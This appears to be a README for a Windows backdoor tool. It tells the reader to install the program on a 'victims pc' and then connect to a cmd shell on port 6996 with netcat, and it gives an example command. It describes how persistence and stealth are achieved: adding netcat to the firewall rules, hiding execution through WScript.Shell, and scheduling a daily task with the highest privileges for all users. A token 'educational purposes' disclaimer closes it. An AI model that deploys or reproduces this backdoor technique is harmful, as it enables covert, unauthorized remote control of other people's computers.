# Local-BackDoor-for-Windows
Install this exe in the victims pc and open a cmd backdoor every day at 22:55 pm.<br /> 
Then open your pc: <br /> 
For linux, install the nc and run the command : **nc -nv "Victims IP Adress" 6996**<br /> 
For example: nc -nv 192.168.1.20 6996 <br /> 
For Windows just download the nc.exe and start the same command with cmd,at the same path with the nc.<br /> 

**How this works**<br /> 
Bypassing windows firewall,by setting the nc app inside firewall rules<br /> 
Starting nc.exe at port 6996 with cmd.exe option<br /> 
Working in silence with the help of WScript.Shell<br /> 
And sheduling to run in highest priveledges every day for all users at specific hour.<br /> 

**Careful**
* Can't bypass windows defender ( wait for updates)<br /> 
* Use it for  educational and informational purposes only and solely as a self-help tool for your own use.
